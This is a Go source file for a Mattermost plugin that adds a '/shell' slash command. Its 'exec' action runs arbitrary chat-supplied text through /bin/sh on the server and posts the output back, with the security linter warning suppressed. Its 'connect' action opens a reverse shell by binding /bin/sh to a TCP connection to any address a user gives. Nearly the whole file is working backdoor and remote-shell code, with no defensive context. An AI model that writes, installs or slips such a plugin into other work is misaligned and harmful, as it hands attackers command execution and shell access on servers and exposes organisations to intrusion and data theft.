package main

import (
	"fmt"
	"net"
	"os/exec"
	"strconv"
	"strings"

	"github.com/mattermost/mattermost-server/v6/plugin"

	"github.com/mattermost/mattermost-server/v6/model"
)

const (
	actionConnect          = "connect"
	actionExecShellCommand = "exec"
)

func (p *Plugin) getCommand() (*model.Command, error) {
	return &model.Command{
		Trigger:          "shell",
		AutoComplete:     true,
		AutoCompleteDesc: "Available commands: exec connect",
		AutoCompleteHint: "[command]",
		AutocompleteData: p.getAutoCompleteData(),
	}, nil
}

func (p *Plugin) getAutoCompleteData() *model.AutocompleteData {
	reverseShell := model.NewAutocompleteData("shell",
		"[command]",
		"Available commands: exec connect")
	connect := model.NewAutocompleteData(actionConnect,
		"[address] [port]", "Shell listener address and port")
	connect.AddStaticListArgument("address", true, []model.AutocompleteListItem{
		{HelpText: "Address", Item: "address"},
		{HelpText: "Port", Item: "port"},
	})
	exec := model.NewAutocompleteData(actionExecShellCommand,
		"[command] [args...]", "Executes command with arguments")
	reverseShell.AddCommand(connect)
	reverseShell.AddCommand(exec)
	return reverseShell
}

func (p *Plugin) ExecuteCommand(c *plugin.Context, args *model.CommandArgs) (*model.CommandResponse, *model.AppError) {
	_, err := p.executeCommand(c, args)
	if err != nil {
		p.API.LogWarn("failed to execute command", "error", err.Error())
	}
	return &model.CommandResponse{}, nil
}

func (p *Plugin) sendMessage(channelId string, message string) {
	post := &model.Post{
		UserId:    p.botUserID,
		ChannelId: channelId,
		Message:   message,
	}
	_, _ = p.API.CreatePost(post)
}

func (p *Plugin) executeCommand(c *plugin.Context, args *model.CommandArgs) (string, error) {
	split := strings.Fields(args.Command)
	if len(split) < 2 {
		return "Invalid number of arguments", nil
	}
	command := split[1]

	switch command {
	case actionConnect:
		if len(split) != 4 {
			return "Invalid number of arguments, expecting three", nil
		}
		address := split[2]
		port, parseErr := strconv.Atoi(split[3])
		if parseErr != nil || !(port > 0 && port <= 65535) {
			return "Port must be a integer between 1 and 65535", nil
		}
		connectErr := p.connectShell(address, port)
		out := fmt.Sprintf("Connecting to %s:%d", address, port)
		p.sendMessage(args.ChannelId, out)
		if connectErr != nil {
			out = fmt.Sprintf("Failed connecting to %s:%d, %v", address, port, connectErr)
			p.sendMessage(args.ChannelId, out)
		} else {
			p.sendMessage(args.ChannelId, "Maybe connected")
		}
	case actionExecShellCommand:
		shellCommandArgs := split[2:]
		cmd := strings.Join(shellCommandArgs, " ")
		out, err := exec.Command("/bin/sh", "-c", cmd).CombinedOutput() //nolint:gosec
		if err != nil {
			p.sendMessage(args.ChannelId, err.Error())
		}
		p.sendMessage(args.ChannelId, "```\n" + string(out) + "\n```")
	}
	return "", nil
}

func (p *Plugin) connectShell(address string, port int) error {
	host := fmt.Sprintf("%s:%d", address, port)
	c, err := net.Dial("tcp", host)

	if err != nil {
		return err
	}

	cmd := exec.Command("/bin/sh")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	_ = cmd.Run()
	c.Close()
	return nil
}
